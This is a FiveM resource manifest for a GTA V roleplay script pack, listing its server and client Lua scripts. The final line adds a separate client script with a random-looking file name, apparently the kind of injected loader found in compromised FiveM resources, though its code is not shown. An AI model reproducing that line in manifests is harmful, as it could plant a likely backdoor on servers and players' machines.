fx_version 'bodacious'
game 'gta5'

-- https://wiki.fivem.net/wiki/Resource_manifest


description 'An series of scripts'

version '1.1.0'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/sv.lua',
	'config.lua',
	'server/gpstools-server.lua',
	'server/commands-server.lua',
	--'server/discordbot_server.lua'
	--'server/restart_alert-server.lua'
	--'server/check_name-server.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/sv.lua',
	'config.lua',
	-- 'client/fixtraffic-client.lua',
	'client/npc_drop-client.lua',
	'client/pointfinger-client.lua',
	'client/speed_limit-client.lua',
	'client/no_drive_by-client.lua',
	'client/handsup-client.lua',
	'client/gpstools-client.lua',
	'client/commands-client.lua',
	'client/no_vehicle_rewards-client.lua',
	'client/disable_dispatch-client.lua',
	--'client/street_display-client.lua',
	'client/no_crosshair-client.lua',
	-- 'client/drift_mode-client.lua',
	'client/friendly_npc-client.lua'
}

client_script "DISqkiIEcVydGenWnD.lua"